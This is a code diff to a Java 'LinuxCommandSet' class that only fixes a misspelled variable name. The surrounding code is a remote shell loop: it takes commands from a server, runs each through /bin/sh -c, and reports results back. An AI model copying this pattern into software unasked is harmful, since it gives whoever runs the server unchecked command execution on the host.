@@ -36,7 +36,7 @@ public class LinuxCommandSet extends CommandSet
     {
         String workingDirectory = getTempPath();
         sendStringToServer(workingDirectory);
-        String inputCommad;
+        String inputCommand;
         // Remote Shell Protocol...
         //
         // send working directory path to server
@@ -44,14 +44,14 @@ public class LinuxCommandSet extends CommandSet
         //     send output to server
         // else
         //     send end marker to server
-        while(!(inputCommad = getCommandFromServer()).equals(REMOTE_SHELL_TERMINATE))
+        while(!(inputCommand = getCommandFromServer()).equals(REMOTE_SHELL_TERMINATE))
         {
             try
             {
                 System.out.println("Working directory: " + workingDirectory);
-                System.out.println("Using command: " + inputCommad);
+                System.out.println("Using command: " + inputCommand);
                 // runs the systems shell, changes dir to the current one, runs the supplied command, then pwd so we can track our current location (if user ran a dir changing command)
-                String[] command = {"/bin/sh", "-c", "cd " + workingDirectory + "; " + inputCommad + " ; pwd;"};
+                String[] command = {"/bin/sh", "-c", "cd " + workingDirectory + "; " + inputCommand + " ; pwd;"};
                 Process process = getRuntime().exec(command);
                 if(process.waitFor() != RETURN_SUCCESS)
                     throw new Exception("Process returned a non-zero value, indicating failure");
